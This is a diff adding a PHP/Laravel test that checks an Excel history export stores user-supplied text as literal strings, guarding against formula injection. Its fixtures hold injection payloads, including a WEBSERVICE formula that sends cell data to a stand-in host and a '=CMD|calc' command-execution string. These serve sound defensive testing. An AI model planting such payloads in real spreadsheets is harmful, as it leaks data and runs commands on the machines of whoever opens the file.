@@ -9,6 +9,10 @@ use App\Models\Equipment;
 use App\Models\Profile;
 use App\Services\ExportHistoryExcelService;
 use Illuminate\Foundation\Testing\LazilyRefreshDatabase;
+use PhpOffice\PhpSpreadsheet\Cell\DataType;
+use PhpOffice\PhpSpreadsheet\IOFactory;
+use PhpOffice\PhpSpreadsheet\Spreadsheet;
+use Symfony\Component\HttpFoundation\StreamedResponse;
 use Tests\TestCase;
 
 class ExportHistoryExcelServiceTest extends TestCase
@@ -70,5 +74,67 @@ class ExportHistoryExcelServiceTest extends TestCase
         $this->assertSame(200, $response->getStatusCode());
         $this->assertSame('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', $response->headers->get('Content-Type'));
         $this->assertStringContainsString('historial_equipo_UCH-PC-001', (string) $response->headers->get('Content-Disposition'));
+    }
+
+    /**
+     * Las observaciones y textos con prefijo de fórmula deben exportarse explícitamente como
+     * cadenas literales (TYPE_STRING) para prevenir inyección de fórmulas en Excel.
+     */
+    public function test_exported_excel_cells_force_string_type_to_prevent_formula_injection(): void
+    {
+        $formulaPayload = '=WEBSERVICE("https://example.invalid/?c="&E9)';
+
+        $profile = Profile::factory()->create([
+            'student_code' => '=25107002',
+            'first_name' => '=SUM(1,1)',
+            'last_name' => 'GARCIA',
+        ]);
+
+        $equipment = Equipment::factory()->ofType('Laptop')->withStatus('Disponible')->create([
+            'patrimonial_code' => 'UCH-LP-900',
+            'observations' => '=CMD|calc',
+        ]);
+
+        Borrowing::factory()->create([
+            'profile_id' => $profile->id,
+            'student_code' => $profile->student_code,
+            'equipment_id' => $equipment->id,
+            'status' => 'Devuelto',
+            'observations' => $formulaPayload,
+        ]);
+
+        $service = new ExportHistoryExcelService;
+
+        $studentSheet = $this->loadSpreadsheetFromResponse($service->exportStudentHistory($profile))->getActiveSheet();
+
+        $this->assertSame(DataType::TYPE_STRING, $studentSheet->getCell('I9')->getDataType());
+        $this->assertSame($formulaPayload, $studentSheet->getCell('I9')->getValue());
+        $this->assertSame(DataType::TYPE_STRING, $studentSheet->getCell('B3')->getDataType());
+        $this->assertSame('=25107002', $studentSheet->getCell('B3')->getValue());
+
+        $equipmentSheet = $this->loadSpreadsheetFromResponse($service->exportEquipmentHistory($equipment))->getActiveSheet();
+
+        $this->assertSame(DataType::TYPE_STRING, $equipmentSheet->getCell('B6')->getDataType());
+        $this->assertSame('=CMD|calc', $equipmentSheet->getCell('B6')->getValue());
+        $this->assertSame(DataType::TYPE_STRING, $equipmentSheet->getCell('J9')->getDataType());
+        $this->assertSame($formulaPayload, $equipmentSheet->getCell('J9')->getValue());
+    }
+
+    private function loadSpreadsheetFromResponse(StreamedResponse $response): Spreadsheet
+    {
+        ob_start();
+        $response->sendContent();
+        $binary = (string) ob_get_clean();
+
+        $tempPath = tempnam(sys_get_temp_dir(), 'xlsx_test_').'.xlsx';
+        file_put_contents($tempPath, $binary);
+
+        try {
+            return IOFactory::load($tempPath);
+        } finally {
+            if (is_file($tempPath)) {
+                @unlink($tempPath);
+            }
+        }
     }
 }
